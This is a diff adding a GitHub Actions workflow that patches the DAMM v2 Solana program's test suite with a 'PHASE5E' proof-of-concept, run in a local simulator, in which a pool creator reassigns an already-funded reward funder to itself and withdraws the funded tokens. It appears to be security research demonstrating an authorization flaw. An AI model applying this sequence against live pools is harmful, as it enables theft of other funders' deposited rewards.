@@ -1,0 +1,184 @@
+name: DAMM v2 Phase5E reward funder takeover
+
+on:
+  workflow_dispatch:
+
+jobs:
+  phase5e:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+
+    steps:
+      - name: Checkout CI repo
+        uses: actions/checkout@v4
+
+      - name: Checkout DAMM v2
+        uses: actions/checkout@v4
+        with:
+          repository: MeteoraAg/damm-v2
+          path: damm-v2
+
+      - name: Install system deps
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y pkg-config build-essential libudev-dev libssl-dev protobuf-compiler
+
+      - name: Install Rust
+        uses: dtolnay/rust-toolchain@stable
+
+      - name: Install Bun
+        uses: oven-sh/setup-bun@v2
+
+      - name: Install pnpm
+        uses: pnpm/action-setup@v4
+        with:
+          version: 11.15.1
+
+      - name: Install Solana/Agave CLI
+        run: |
+          sh -c "$(curl -sSfL https://release.anza.xyz/stable/install)"
+          echo "$HOME/.local/share/solana/install/active_release/bin" >> "$GITHUB_PATH"
+
+      - name: Install Anchor CLI 1.0.2
+        run: |
+          cargo install \
+            --git https://github.com/solana-foundation/anchor \
+            --tag v1.0.2 \
+            anchor-cli \
+            --locked \
+            --force
+
+      - name: Patch Phase5E test
+        working-directory: damm-v2
+        run: |
+          python3 - <<'PY'
+          from pathlib import Path
+
+          p = Path("tests/rewardByCreator.test.ts")
+          s = p.read_text()
+
+          if 'import { expect } from "chai";' not in s:
+              s = s.replace('import BN from "bn.js";\n', 'import BN from "bn.js";\nimport { expect } from "chai";\n')
+
+          if 'getOrCreateAssociatedTokenAccount' not in s:
+              marker = '''import {
+            createToken2022,
+            createTransferFeeExtensionWithInstruction,
+            mintToToken2022,
+          } from "./helpers/token2022";
+          '''
+              s = s.replace(marker, marker + 'import { getOrCreateAssociatedTokenAccount, getTokenBalance } from "./helpers/token";\n')
+
+          test_block = r'''
+              it("PHASE5E: creator can reassign already-funded reward0 funder and withdraw ineligible rewards", async () => {
+                liquidity = new BN(MIN_LP_AMOUNT);
+                sqrtPrice = new BN(MIN_SQRT_PRICE);
+
+                const { pool } = await initializePool(svm, {
+                  payer: creator,
+                  creator: creator.publicKey,
+                  config,
+                  tokenAMint,
+                  tokenBMint,
+                  liquidity,
+                  sqrtPrice,
+                  activationPoint: null,
+                });
+
+                const position = await createPosition(svm, user, user.publicKey, pool);
+
+                await addLiquidity(svm, {
+                  owner: user,
+                  pool,
+                  position,
+                  liquidityDelta: new BN(100),
+                  tokenAAmountThreshold: new BN(200),
+                  tokenBAmountThreshold: new BN(200),
+                });
+
+                const index = 0;
+
+                await initializeReward(svm, {
+                  index,
+                  payer: creator,
+                  rewardDuration: new BN(24 * 60 * 60),
+                  pool,
+                  rewardMint,
+                  funder: funder.publicKey,
+                });
+
+                await fundReward(svm, {
+                  index,
+                  funder,
+                  pool,
+                  carryForward: true,
+                  amount: new BN("1000000"),
+                });
+
+                const poolAfterFund = getPool(svm, pool);
+                expect(poolAfterFund.rewardInfos[index].funder.toString()).eq(funder.publicKey.toString());
+
+                await updateRewardFunder(svm, {
+                  index,
+                  signer: creator,
+                  pool,
+                  newFunder: creator.publicKey,
+                });
+
+                const poolAfterTakeover = getPool(svm, pool);
+                expect(poolAfterTakeover.rewardInfos[index].funder.toString()).eq(creator.publicKey.toString());
+
+                const tokenProgram = svm.getAccount(rewardMint)!.owner;
+                const creatorRewardAta = getOrCreateAssociatedTokenAccount(
+                  svm,
+                  creator,
+                  rewardMint,
+                  creator.publicKey,
+                  tokenProgram
+                );
+
+                warpToTimestamp(svm, poolAfterTakeover.rewardInfos[index].rewardDurationEnd.addn(5000));
+
+                const before = new BN(getTokenBalance(svm, creatorRewardAta));
+
+                await withdrawIneligibleReward(svm, {
+                  index,
+                  funder: creator,
+                  pool,
+                });
+
+                const after = new BN(getTokenBalance(svm, creatorRewardAta));
+                const delta = after.sub(before);
+
+                console.log("PHASE5E_CREATOR_REWARD0_FUNDER_TAKEOVER_DELTA", {
+                  before: before.toString(),
+                  after: after.toString(),
+                  delta: delta.toString(),
+                });
+
+                expect(delta.gt(new BN(0))).eq(true);
+              });
+
+          '''
+
+          if "PHASE5E: creator can reassign already-funded reward0 funder" not in s:
+              s = s.replace('    it("Creator cannot create reward at index 1", async () => {', test_block + '\n    it("Creator cannot create reward at index 1", async () => {', 1)
+
+          p.write_text(s)
+          print("[patched]", p)
+          PY
+
+      - name: Install deps
+        working-directory: damm-v2
+        run: pnpm install
+
+      - name: Run Phase5E
+        working-directory: damm-v2
+        run: |
+          pnpm test tests/rewardByCreator.test.ts --grep "PHASE5E" 2>&1 | tee phase5e.log
+
+      - name: Upload Phase5E log
+        uses: actions/upload-artifact@v4
+        with:
+          name: phase5e-reward0-funder-takeover-log
+          path: damm-v2/phase5e.log
